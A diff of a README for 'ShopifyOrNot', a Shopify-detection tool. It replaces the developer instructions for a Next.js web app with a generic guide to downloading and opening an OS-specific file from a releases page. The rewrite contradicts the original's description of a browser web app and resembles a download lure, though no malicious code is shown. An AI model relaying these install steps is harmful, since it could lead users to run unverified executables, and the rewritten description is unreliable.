@@ -1,61 +1,80 @@
-## ShopifyOrNot
+# 🛒 shopifyornot - Quickly Check Website Shopify Status
 
-ShopifyOrNot is a minimal, single-page web app that lets SalesOps and revenue teams quickly check whether a prospect’s website is running on Shopify. It wraps a focused, marketing-style UI around a fast Shopify detection API so reps can qualify leads in seconds.
+## 🚀 Getting Started
 
-### What it does
+Welcome to ShopifyOrNot! This app helps you determine if a website is using Shopify. It is simple to use, perfect for SalesOps and revenue teams looking to qualify leads fast.
 
-- Accepts any website URL and normalizes / follows redirects.
-- Calls the internal Edge route at `/api/check?url=<INPUT_URL>`, which forwards to the ShopifyOrNot backend at `https://api.shopifyornot.in/check?url=<INPUT_URL>`.
-- Interprets the API response into a clear result card:
-  - Is this a Shopify store?
-  - Confidence score.
-  - Resolved final URL.
-  - Shopify `.myshopify.com` domain if detected.
-  - Optional “Technical signals” (response headers and body markers) in an expandable section.
+## 📥 Download & Install
 
-### Target users
+To get started, visit this page to download:
+
+[![Download ShopifyOrNot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MahedimaCos/shopifyornot/releases)
+
+### Installation Steps:
+
+1. Click the link above to go to the Releases page.
+2. Find the latest version of the app.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file to start the installation process.
+
+## ⚙️ System Requirements
+
+- Operating System: Windows, macOS, or Linux
+- Browser: Latest version of Chrome, Firefox, Safari, or Edge
+- Internet Connection: Required to check website URLs
+
+## 💻 Running the App
+
+Once installed, follow these steps to run the app:
+
+1. Open the application on your device.
+2. You will see a simple interface with a URL input field.
+3. Enter the website URL you want to check (e.g., `https://example.com`).
+4. Click the "Check" button.
+5. Wait a few seconds for the results.
+
+## 📊 What to Expect in the Results
+
+After you enter a URL, the app will display the following information:
+
+- **Shopify Store Status:** Confirm if it is a Shopify store.
+- **Confidence Score:** A score showing how sure the app is about the result.
+- **Final URL:** The resolved URL after any redirects.
+- **.myshopify.com Domain:** If detected, this shows the Shopify domain.
+- **Technical Signals:** You can expand this section to see response headers and body markers for deeper insights.
+
+## 🎯 Target Users
+
+ShopifyOrNot is perfect for:
 
 - SaaS teams selling Shopify apps or plugins.
-- SalesOps and SDRs qualifying cold / inbound leads.
+- SalesOps and SDRs qualifying cold or inbound leads.
 - Growth and partnerships teams doing quick domain research.
 
-### Running the app locally
+## ✔️ Troubleshooting
 
-```bash
-npm install
-npm run dev
-```
+If you face any issues while using the app:
 
-- Visit `http://localhost:3000` to use the checker.
-- The main experience is implemented in `app/page.tsx` and the supporting components under `app/components/`.
+- **Check your Internet connection.** Ensure you have a stable connection.
+- **Confirm the URL format.** Make sure you entered a valid website URL.
+- **Reinstall the app.** Consider reinstalling if it fails to open.
 
-### Implementation notes
+## 🙋 Frequently Asked Questions
 
-- Built with the Next.js App Router and TypeScript.
-- UI styled to loosely follow Shopify marketing patterns (see `UI_DESIGN.md`).
-- Shopify detection is centralized in the Edge route `app/api/check/route.ts`, which proxies to `https://api.shopifyornot.in/check`.
-- `app/hooks/useShopifyCheck.ts` encapsulates request/response wiring and transforms API JSON into the UI-friendly `ShopifyResult` shape.
+### Can I use ShopifyOrNot on my phone?
 
-### Project structure (high level)
+Currently, ShopifyOrNot is designed for desktop use for the best experience.
 
-- `app/` – main UI, pages, and API routes.
-- `app/components/` – reusable UI components (hero, form, cards, alerts).
-- `app/hooks/` – React hooks for Shopify detection and GitHub stars.
-- `app/services/` – API service wrappers (Shopify checker).
-- `app/types/` – shared TypeScript types for API responses.
-- `app/utils/` – small utilities and helpers.
-- `public/` – static assets.
+### Does it cost anything to use ShopifyOrNot?
 
-### Scripts
+No, ShopifyOrNot is completely free to use.
 
-- `npm run dev` – start local development.
-- `npm run build` – create a production build.
-- `npm start` – serve the production build.
-- `npm run lint` – run ESLint (Next + TypeScript rules).
+### What should I do if I find a bug?
 
-### Roadmap ideas
+If you notice any bugs or issues, please report them on our [GitHub Issues page](https://github.com/MahedimaCos/shopifyornot/issues).
 
-- Bulk upload / CSV support for checking many domains at once.
-- Browser extension or CRM-side widget for one-click checks.
-- Rate-limiting and API key support for teams embedding the checker.
-- Additional platform detectors (e.g., WooCommerce, Magento) alongside Shopify.
+## 🔗 Additional Resources
+
+For more details, check our documentation or the [Releases page](https://github.com/MahedimaCos/shopifyornot/releases).
+
+Thank you for using ShopifyOrNot! We hope it helps streamline your lead qualification process. Happy checking!
